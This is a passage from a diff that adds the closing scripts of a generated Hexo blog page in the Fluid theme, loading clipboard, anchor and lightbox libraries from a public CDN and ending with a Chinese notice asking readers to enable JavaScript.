+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
